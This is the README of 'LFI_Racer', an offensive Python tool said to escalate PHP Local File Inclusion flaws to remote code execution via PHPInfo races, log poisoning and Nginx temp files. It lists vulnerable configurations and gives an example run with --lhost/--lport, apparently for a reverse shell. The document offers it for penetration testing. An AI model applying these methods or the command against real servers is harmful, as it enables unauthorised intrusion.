#  LFI_Racer

**A tool to exploit Local File Inclusion (LFI) vulnerabilities for Remote Code Execution (RCE)**  
*Crafted by 3lacker*
![Alt text](/mod_screen.png "a title")
---

##  What is LFI_Racer?

LFI_Racer is a Python-based exploitation tool designed to identify and exploit Local File Inclusion (LFI) vulnerabilities in web applications, escalating them to achieve Remote Code Execution (RCE). It supports multiple exploitation techniques, including PHPInfo-assisted LFI, log file poisoning, and Nginx temporary file abuse, making it versatile for various server configurations.

---

##  Scope

LFI_Racer is built for security researchers and penetration testers to assess the security of web applications in controlled environments. It targets LFI vulnerabilities in PHP-based applications running on specific server setups, allowing testers to:

- **Verify LFI existence** by attempting to read sensitive system files.
- **Test RCE potential** through crafted payloads.
- **Exploit vulnerabilities** using three distinct methods:
  1. **PHPInfo**: Leverages PHPInfo pages to upload temporary files.
  2. **Log Poisoning**: Injects malicious payloads into server logs.
  3. **Nginx Temp Files**: Exploits Nginx's client body buffering to access deleted temp files.

> **Warning**: Use LFI_Racer only on systems you have explicit permission to test. Unauthorized use is illegal and unethical.

---

##  Vulnerable Targets

LFI_Racer is effective against the following configurations:

- **Web Servers**:
  - Nginx (any version with client body buffering enabled, typically pre-2025 builds).
  - Apache (log poisoning scenarios, versions prior to strict logging patches).

- **PHP Versions**:
  - PHP 5.x to 8.x (vulnerable if `include` or `require` functions are used unsanitized).
  - Configurations with `file_uploads=On` or accessible PHPInfo pages for PHPInfo mode.
  - Vulnerable to log poisoning if PHP can access logs (e.g., `/var/log/nginx/access.log`).

- **Specific Scenarios**:
  - Nginx + PHP-FPM setups where both run as the same user (e.g., `www-data`).
  - Servers with readable `/proc` filesystem for Nginx temp file exploits.
  - Applications with unsanitized `$_GET` or `$_POST` parameters in `include` statements (e.g., `include($_GET['file'])`).

- **Patched or Mitigated**:
  - Nginx versions with disabled or restricted client body buffering (post-2021 patches in some distros).
  - PHP with `open_basedir` restrictions or disabled `include` functions.
  - Servers with locked-down log directories or disabled `/proc` access.

---

##  Usage

Run `lfi_racer.py` with no arguments to see the help menu, or use specific flags to target a vulnerable system:

```bash
python3 lfi_racer.py -h
```

Example to exploit a PHPInfo-based LFI:

```bash
python3 lfi_racer.py -m phpinfo -l http://target/lfi.php?file= -i http://target/phpinfo.php --lhost 192.168.1.100 --lport 4444
```

---



 
